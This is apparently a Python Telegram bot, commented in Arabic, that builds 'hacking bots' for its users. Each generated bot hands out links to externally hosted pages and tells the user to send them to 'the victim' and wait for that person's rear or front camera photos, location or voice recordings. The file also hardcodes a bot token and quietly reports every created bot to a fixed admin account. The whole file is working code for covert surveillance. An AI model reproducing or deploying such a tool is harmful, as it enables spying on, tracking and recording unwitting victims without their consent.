import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import requests
import threading
import os

# توكن بوت المصنع
FACTORY_TOKEN = "7974888432:AAHfx-I8vN2J8sZcJrM03Lfp8t-v2HmF9N4"
factory_bot = telebot.TeleBot(FACTORY_TOKEN)

# قنوات الاشتراك الإجباري لكل بوت (مخزن بالذاكرة فقط)
force_sub_channels = {}

# دالة تشفير التوكن (تبديل أحرف بسيط)
def encrypt_token(token):
    table = str.maketrans(
        "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
        "zyxwvutsrqponmlkjihgfedcbaZYXWVUTSRQPONMLKJIHGFEDCBA9876543210"
    )
    return token.translate(table)

# التحقق من الاشتراك في قناة المصنع عند /start
@factory_bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    channel_username = "@IRX_J"

    try:
        member = factory_bot.get_chat_member(channel_username, user_id)
        if member.status not in ['member', 'administrator', 'creator']:
            join_link = f"https://t.me/{channel_username.lstrip('@')}"
            btn = InlineKeyboardMarkup()
            btn.add(InlineKeyboardButton("📢 قناة التحديثات", url=join_link))
            btn.add(InlineKeyboardButton("✅ تم الاشتراك", callback_data="check_sub"))
            factory_bot.send_message(message.chat.id, "🚫 يجب عليك الاشتراك بقناة التحديثات", reply_markup=btn)
            return
    except Exception:
        factory_bot.send_message(message.chat.id, "❌ حدث خطأ أثناء التحقق من الاشتراك.")
        return

    kb = InlineKeyboardMarkup()
    kb.add(InlineKeyboardButton("🤖 صنع بوت اختراق", callback_data="make_bot"))
    factory_bot.send_message(message.chat.id, """حياك الله في بوت صانع بوتات اختراق

المطور @lTF_l
قناة المطور @IRX_J""", reply_markup=kb)

# إعادة التحقق من الاشتراك بعد الضغط على زر "تم الاشتراك"
@factory_bot.callback_query_handler(func=lambda call: call.data == "check_sub")
def recheck_subscription(call):
    user_id = call.from_user.id
    channel_username = "@IRX_J"

    try:
        member = factory_bot.get_chat_member(channel_username, user_id)
        if member.status in ['member', 'administrator', 'creator']:
            kb = InlineKeyboardMarkup()
            kb.add(InlineKeyboardButton("🤖 صنع بوت اختراق", callback_data="make_bot"))
            factory_bot.send_message(call.message.chat.id, """حياك الله في بوت صانع بوتات اختراق

المطور @lTF_l
قناة المطور @IRX_J""", reply_markup=kb)
        else:
            factory_bot.answer_callback_query(call.id, "❌ لم يتم التأكد من الاشتراك بعد.", show_alert=True)
    except Exception as e:
        factory_bot.answer_callback_query(call.id, f"❌ خطأ: {e}", show_alert=True)

# عند الضغط على زر "صنع بوت"
@factory_bot.callback_query_handler(func=lambda call: call.data == "make_bot")
def ask_token(call):
    factory_bot.send_message(call.message.chat.id, "📝 ارسل التوكن الخاص بك يا عزيزي")
    factory_bot.register_next_step_handler(call.message, lambda msg: handle_token(msg, call.from_user.id))

# دالة استقبال التوكن وإنشاء بوت جديد في Thread
def handle_token(message, admin_id):
    user_token = message.text.strip()
    try:
        info = requests.get(f"https://api.telegram.org/bot{user_token}/getMe").json()
        if not info["ok"]:
            factory_bot.send_message(message.chat.id, "❌ التوكن غير صالح.")
            return
        factory_bot.send_message(message.chat.id, "⏳ جاري إعداد البوت...")

        def run_new_bot():
            bot = telebot.TeleBot(user_token)

            # أسماء ملفات الحالة والتنبيهات (ضعف التوكن في اسم الملف قد يسبب مشاكل، لكن للمثال نستخدمه)
            status_file = f"{user_token}_status.txt"
            notify_file = f"{user_token}_notify.txt"
            notified_users_file = f"{user_token}_notified_users.txt"

            # إنشاء ملفات الحالة والتنبيه إن لم تكن موجودة
            for file, content in [(status_file, "ON"), (notify_file, "ON")]:
                if not os.path.exists(file):
                    with open(file, "w") as f:
                        f.write(content)
            if not os.path.exists(notified_users_file):
                with open(notified_users_file, "w") as f:
                    pass

            def is_enabled():
                with open(status_file, "r") as f:
                    return f.read().strip() == "ON"

            def set_status(state):
                with open(status_file, "w") as f:
                    f.write(state)

            def is_notify_enabled():
                with open(notify_file, "r") as f:
                    return f.read().strip() == "ON"

            def set_notify(state):
                with open(notify_file, "w") as f:
                    f.write(state)

            # تحقق الاشتراك في قنوات الاشتراك الإجباري (حسب التوكن)
            def is_user_subscribed_force(user_id):
                for ch in force_sub_channels.get(bot.token, []):
                    try:
                        member = bot.get_chat_member(f"@{ch}", user_id)
                        if member.status not in ['member', 'administrator', 'creator']:
                            return False
                    except:
                        return False
                return True

            # بدء بوت جديد - التعامل مع /start
            @bot.message_handler(commands=['start'])
            def start_new(message2):
                if not is_enabled():
                    return

                user_id_str = str(message2.from_user.id)
                if not is_user_subscribed_force(message2.from_user.id):
                    kb = InlineKeyboardMarkup()
                    for ch in force_sub_channels.get(bot.token, []):
                        join_link = f"https://t.me/{ch}"
                        kb.add(InlineKeyboardButton(f"📢 اشترك في @{ch}", url=join_link))
                    kb.add(InlineKeyboardButton("✅ تم الاشتراك", callback_data="check_force_sub"))
                    bot.send_message(message2.chat.id, "🚫 يجب الاشتراك في القنوات التالية:", reply_markup=kb)
                    return

                if is_notify_enabled():
                    with open(notified_users_file, "r") as f:
                        notified = f.read().splitlines()
                    if user_id_str not in notified:
                        try:
                            bot.send_message(admin_id, f"📥 دخل شخص جديد للبوت:\n\n👤 يوزر: @{message2.from_user.username}\n🆔 ID: `{message2.from_user.id}`", parse_mode="Markdown")
                            with open(notified_users_file, "a") as f:
                                f.write(user_id_str + "\n")
                        except:
                            pass

                kb = InlineKeyboardMarkup(row_width=2)
                kb.row(
                    InlineKeyboardButton("📷 اختراق الكاميرا الخلفية", callback_data="cam_back"),
                    InlineKeyboardButton("🔥 اختراق الكاميرا الأمامية", callback_data="cam_front")
                )
                kb.row(
                    InlineKeyboardButton("📌 اختراق الموقع", callback_data="location"),
                    InlineKeyboardButton("🎤 تسجيل رسالة صوتية", callback_data="mic_record")
                )
                bot.send_message(message2.chat.id, "🤖✨ مرحبًا بك، جميع الأزرار مجانية 😊", reply_markup=kb)

            # التحقق من الاشتراك الإجباري عند الضغط على زر "تم الاشتراك"
            @bot.callback_query_handler(func=lambda call: call.data == "check_force_sub")
            def check_force_sub(call):
                if not is_user_subscribed_force(call.from_user.id):
                    bot.answer_callback_query(call.id, "❌ لم تشترك بعد.", show_alert=True)
                else:
                    kb = InlineKeyboardMarkup(row_width=2)
                    kb.row(
                        InlineKeyboardButton("📷 اختراق الكاميرا الخلفية", callback_data="cam_back"),
                        InlineKeyboardButton("🔥 اختراق الكاميرا الأمامية", callback_data="cam_front")
                    )
                    kb.row(
                        InlineKeyboardButton("📌 اختراق الموقع", callback_data="location"),
                        InlineKeyboardButton("🎤 تسجيل صوت الضحية", callback_data="mic_record")
                    )
                    bot.send_message(call.message.chat.id, "🤖✨مرحبا بك جميع الازرار مجانا 😊", reply_markup=kb)

            # معالجة أزرار الاختراق وإرسال الروابط المشفرة
            @bot.callback_query_handler(func=lambda call: call.data in ["cam_back", "cam_front", "location", "mic_record"])
            def send_link(call):
                if not is_enabled():
                    return
                encrypted_token = encrypt_token(user_token)
                user_id = call.from_user.id

                if call.data == "cam_back":
                    link = f"https://spectacular-crumble-77f830.netlify.app/?id={user_id}&tok={encrypted_token}"
                    bot.answer_callback_query(call.id, "✅ تم توليد الرابط")
                    bot.send_message(call.message.chat.id, f"انسخ الرابط وأرسله للضحية وانتظر الصورة:\n{link}")

                elif call.data == "cam_front":
                    link = f"https://profound-bubblegum-7f29b2.netlify.app/?id={user_id}&tok={encrypted_token}"
                    bot.answer_callback_query(call.id, "✅ تم توليد الرابط")
                    bot.send_message(call.message.chat.id, f"انسخ الرابط وأرسله للضحية وانتظر الصورة:\n{link}")

                elif call.data == "location":
                    link = f"https://illustrious-panda-c2ece1.netlify.app/?id={user_id}&tok={encrypted_token}"
                    bot.answer_callback_query(call.id, "✅ تم توليد رابط الموقع")
                    bot.send_message(call.message.chat.id, f"📌 انسخ الرابط وأرسله للضحية وانتظر المعلومات:\n{link}")

                elif call.data == "mic_record":
                    link = f"https://tourmaline-kulfi-aeb7ea.netlify.app/?id={user_id}&tok={encrypted_token}"
                    bot.answer_callback_query(call.id, "✅ تم توليد رابط تسجيل الصوت")
                    bot.send_message(call.message.chat.id, f"انسخ الرابط وأرسله للضحية وانتظر التسجيل:\n{link}")

            # لوحة تحكم المسؤول (ادمن المصنع فقط)
            @bot.message_handler(commands=['admin'])
            def admin_panel(msg):
                if msg.from_user.id != admin_id:
                    return

                kb = InlineKeyboardMarkup(row_width=2)
                kb.add(InlineKeyboardButton("👥 المشتركين", callback_data="subscribers"))
                kb.row(
                    InlineKeyboardButton("✅ فتح البوت", callback_data="open_bot"),
                    InlineKeyboardButton("❌ قفل البوت", callback_data="close_bot")
                )
                kb.row(
                    InlineKeyboardButton("➕ إضافة قناة", callback_data="add_force_sub"),
                    InlineKeyboardButton("🗑️ إزالة قناة", callback_data="remove_force_sub")
                )
                kb.add(InlineKeyboardButton("🔄 تحديثات المصنع", url="https://t.me/IRX_J"))
                kb.row(
                    InlineKeyboardButton("🟢 تفعيل التنبيه", callback_data="enable_notify"),
                    InlineKeyboardButton("🔴 تعطيل التنبيه", callback_data="disable_notify")
                )

                bot.send_message(
                    msg.chat.id,
                    "مرحبًا! إليك أوامرك:\n\n"
                    "1. إدارة المشتركين.\n"
                    "2. إرسال إذاعات.\n"
                    "3. ضبط الاشتراك الإجباري.\n"
                    "4. تفعيل/تعطيل التنبيهات.\n"
                    "5. إدارة حالة البوت.",
                    reply_markup=kb
                )

            # تنفيذ أوامر الادمن
            @bot.callback_query_handler(func=lambda call: call.data in ["subscribers", "open_bot", "close_bot", "add_force_sub", "remove_force_sub", "enable_notify", "disable_notify"])
            def admin_actions(call):
                if call.from_user.id != admin_id:
                    return

                if call.data == "subscribers":
                    bot.answer_callback_query(call.id, "👥 عداد المشتركين غير مفعّل.", show_alert=True)

                elif call.data == "open_bot":
                    set_status("ON")
                    bot.send_message(call.message.chat.id, "✅ تم فتح البوت بنجاح.")

                elif call.data == "close_bot":
                    set_status("OFF")
                    bot.send_message(call.message.chat.id, "❌ تم قفل البوت بنجاح.")

                elif call.data == "enable_notify":
                    set_notify("ON")
                    bot.send_message(call.message.chat.id, "🟢 تم تفعيل التنبيه.")

                elif call.data == "disable_notify":
                    set_notify("OFF")
                    bot.send_message(call.message.chat.id, "🔴 تم تعطيل التنبيه.")

                elif call.data == "add_force_sub":
                    bot.send_message(call.message.chat.id, "✅ أرسل معرف القناة (مثال: example).")
                    bot.register_next_step_handler(call.message, lambda msg: add_channel(msg, bot))

                elif call.data == "remove_force_sub":
                    bot.send_message(call.message.chat.id, "✂️ أرسل معرف القناة المراد إزالتها.")
                    bot.register_next_step_handler(call.message, lambda msg: remove_channel(msg, bot))

            # إضافة قناة اشتراك إجباري
            def add_channel(msg, bot):
                ch = msg.text.strip().replace("@", "")
                try:
                    member = bot.get_chat_member(f"@{ch}", bot.get_me().id)
                    if member.status in ["administrator", "creator"]:
                        lst = force_sub_channels.get(bot.token, [])
                        if ch not in lst:
                            lst.append(ch)
                        force_sub_channels[bot.token] = lst
                        bot.send_message(msg.chat.id, f"✅ تم إضافة @{ch} للاشتراك الإجباري.")
                    else:
                        bot.send_message(msg.chat.id, "❌ يجب رفع البوت كأدمن في القناة.")
                except Exception:
                    bot.send_message(msg.chat.id, "❌ خطأ أثناء التحقق من القناة.")

            # إزالة قناة اشتراك إجباري
            def remove_channel(msg, bot):
                ch = msg.text.strip().replace("@", "")
                lst = force_sub_channels.get(bot.token, [])
                if ch in lst:
                    lst.remove(ch)
                    force_sub_channels[bot.token] = lst
                    bot.send_message(msg.chat.id, f"🗑️ تم إزالة @{ch} من الاشتراك الإجباري.")
                else:
                    bot.send_message(msg.chat.id, "❌ هذه القناة غير موجودة.")

            # بدء تشغيل البوت الجديد (تشغيل الاستماع)
            bot.infinity_polling()

        # تشغيل البوت الجديد في Thread مستقل عشان المصنع يقدر يشغل عدة بوتات بنفس الوقت
        threading.Thread(target=run_new_bot).start()

        # ارسال رسالة للادمن المصنع بتفاصيل البوت الجديد
        factory_bot.send_message(
            7598229780,
            f"✅ تم إنشاء بوت جديد:\n\n"
            f"🤖 الاسم: {info['result']['first_name']}\n"
            f"📟 اليوزر: @{info['result']['username']}\n"
            f"🆔 ID: `{info['result']['id']}`",
            parse_mode="Markdown"
        )

        factory_bot.send_message(message.chat.id, "✅ تم تشغيل البوت بنجاح.")
    except Exception as e:
        factory_bot.send_message(message.chat.id, f"❌ حدث خطأ: {e}")

# بدء تشغيل مصنع البوتات
print("✅ مصنع البوتات يعمل...")
factory_bot.infinity_polling()
